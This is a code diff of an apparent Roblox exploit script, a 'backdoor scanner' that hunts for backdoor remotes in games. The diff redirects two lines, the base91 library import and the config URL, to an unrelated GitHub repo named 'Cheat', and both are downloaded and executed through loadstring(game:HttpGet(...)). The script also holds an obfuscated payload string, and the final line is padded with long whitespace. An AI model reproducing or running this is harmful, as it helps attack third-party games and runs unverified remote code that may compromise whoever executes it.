@@ -5,7 +5,7 @@ local logService = game:GetService("LogService")
 local runService = game:GetService("RunService")
 local starterGui = game:GetService("StarterGui")
 -- imports
-local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dekkonot/base91-luau/main/src/init.lua"))()
+local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/sptzycahyani-cell/Cheat/main/init.lua"))()
 -- variables
 local config
 local executorAPI
@@ -14,8 +14,8 @@ local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttr
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!#$%&()*+,./:;<=>?@[]^_`{|}~'"
 local payloadList = table.create(20)
 local CONSTANTS = {
-	CONFIG_URL = "https://raw.githubusercontent.com/meowido/beckdeer-skenner/main/src/default-config.lua",
-	FOLDER_NAME = "beckdeer-skenner"
+	CONFIG_URL = "https://raw.githubusercontent.com/sptzycahyani-cell/Cheat/main/config.lua",
+	FOLDER_NAME = "Cheat"
 }
 local remoteInfo = {
 	["foundBackdoor"] = false,
@@ -563,4 +563,4 @@ do -- backdoor finding
 			newNotification(msgOutputs.noBackdoorRemote)
 		end
 	end
-end
+																										end
